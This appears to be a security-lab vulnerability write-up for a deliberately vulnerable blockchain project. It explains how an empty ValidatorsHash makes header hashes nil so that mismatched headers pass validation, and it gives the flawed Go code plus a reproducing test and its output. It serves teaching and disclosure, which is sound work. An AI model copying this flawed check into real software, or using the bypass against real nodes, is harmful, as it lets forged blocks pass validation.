# 1. [DC-05] Improper Check of Header

## 1.1. Tag

`header`;

`validate`;

## 1.2. Vulnerability description

Improper Check of Header

while the block header is checked, the legality of the block and signed block will be checked. But the code check `ValidatorsHash` improperly, ignoring the `lite` client. For `lite` client will not add `ValidatorsHash` when it sends the message to the nodes, that's to say, `ValidatorsHash` is always empty for `lite` client, which make different block bypass the check.

## 1.3. Vulnerability analysis

```go
func ValidateBlock(meta *types.Block, sh types.SignedHeader) error {
    if meta == nil {
        return errors.New("expecting a non-nil Block")
    }
    err := ValidateHeader(&meta.Header, sh) // XuanMao: track
    if err != nil {
        return err
    }
    if !bytes.Equal(meta.Data.Hash(), meta.Header.DataHash) {
        return errors.New("Data hash doesn't match header")
    }
    return nil
    }
```

```go
func ValidateHeader(head *types.Header, sh types.SignedHeader) error {
    if head == nil {
        return errors.New("expecting a non-nil Header")
    }
    if sh.Header == nil {
        return errors.New("unexpected empty SignedHeader")
    }
    // Make sure they are for the same height (obvious fail).
    if head.Height != sh.Height {
        return errors.New("Header heights mismatched")
    }
    // Check if they are equal by using hashes.
    if !bytes.Equal(head.Hash(), sh.Hash()) {//XuanMao: Track
        return errors.New("Headers don't match")
    }
    return nil
}
```

```golang
func (h *Header) Hash() cmn.HexBytes {
 if len(h.ValidatorsHash) == 0 {  // Track
     return nil
 }
```

## 1.4. Reproduce

Here we use the testing script `hdr_test.go` to test. You can create a file anywhere named `hdr_test.go` and copy the content below, run it in the terminal.

### 1.4.1. Use go test script to test

```golang
// hdr_test.go
// XuanMao: bug test
package hrd_validate

import (
    "testing"
    "time"
    "bytes"

    "github.com/XuanMaoSecLab/DolphinChain/lite/proxy"
    "github.com/XuanMaoSecLab/DolphinChain/types"
)

func TestLiteValidationIsFallacious(t *testing.T) {
    block := &types.Block{
        Header: types.Header{
            Height: 11,
            Time:   time.Date(2018, 1, 1, 1, 1, 1, 1, time.UTC),
        },
        Data: *new(types.Data),
    }
    t.Log(block)
    commit := types.SignedHeader{
        Header: &types.Header{
            Height: 11,
            Time:   time.Date(2017, 1, 1, 1, 1, 1, 1, time.UTC),
        },
    }
    t.Log(commit)
//
    if err := proxy.ValidateBlock(block, commit); err == nil {
        t.Log(commit.Hash())
        t.Errorf("Pwned!")
    }
}

func TestHeaderFails(t *testing.T) {
    tests := []struct {
        hdr         *types.Header
        wantNilHash bool
    }{
        {hdr: nil, wantNilHash: true},
        {hdr: &types.Header{}, wantNilHash: true},
        {
            hdr: &types.Header{
                Height: 100,
                Time:   time.Now().UTC(),
            },
            wantNilHash: false,
        },
        {
            hdr: &types.Header{
                Height: 100,
                Time:   time.Now().UTC(),
            },
            wantNilHash: false,
        },
        {
            hdr: &types.Header{
                Height: 111,
                Time:   time.Date(2018, 12, 2, 1, 1, 3, 1, time.UTC),
            },
            wantNilHash: false,
        },
    }

    for i, tt := range tests {
        hdr := tt.hdr
        if hdr == nil {
            hdr = new(types.Header)
        }
        hash := hdr.Hash()
        if g, w := bytes.Equal(hash, nil), tt.wantNilHash; g != w {
            t.Errorf("#%d: gotIsNilHash=%v gotHash=(% X) wantNil=%v", i, g, hash, w)
        }
    }
}

```

### 1.4.2. Testing result

```sh
[root@ main]# go test -v -run=TestLiteValidationIsFallacious
=== RUN   TestLiteValidationIsFallacious
--- FAIL: TestLiteValidationIsFallacious (0.00s)
    hdr_test.go:21: Block{
          Header{
            Version:        {0 0}
            ChainID:        
            Height:         11
            Time:           2018-01-01 01:01:01.000000001 +0000 UTC
            NumTxs:         0
            TotalTxs:       0
            LastBlockID:    :0:000000000000
            LastCommit:     
            Data:           
            Validators:     
            NextValidators: 
            App:            
            Consensus:       
            Results:        
            Evidence:       
            Proposer:       
          }#
          Data{
            
          }#
          EvidenceData{
            
          }#
          nil-Commit
        }#
    hdr_test.go:28: SignedHeader{
          Header{
            Version:        {0 0}
            ChainID:        
            Height:         11
            Time:           2017-01-01 01:01:01.000000001 +0000 UTC
            NumTxs:         0
            TotalTxs:       0
            LastBlockID:    :0:000000000000
            LastCommit:     
            Data:           
            Validators:     
            NextValidators: 
            App:            
            Consensus:       
            Results:        
            Evidence:       
            Proposer:       
          }#
          nil-Commit
        }
    hdr_test.go:31: 
    hdr_test.go:32: Pwned!
FAIL
exit status 1
FAIL    github.com/XuanMaoSecLab/DolphinChain/reproduce/main    0.070s

```

## 1.5. Fix

For it can not be exploited directly, no fix temporarily.

## 1.6. Reference

Vulnerable code from : [Hash verification](https://github.com/tendermint/tendermint/blob/c8a2bdf78ba7aaaf4284fa78c1b9b05c5e7342bc/types/block.go#L179-L181)

You can check related issue [here](https://github.com/tendermint/tendermint/issues/1302).
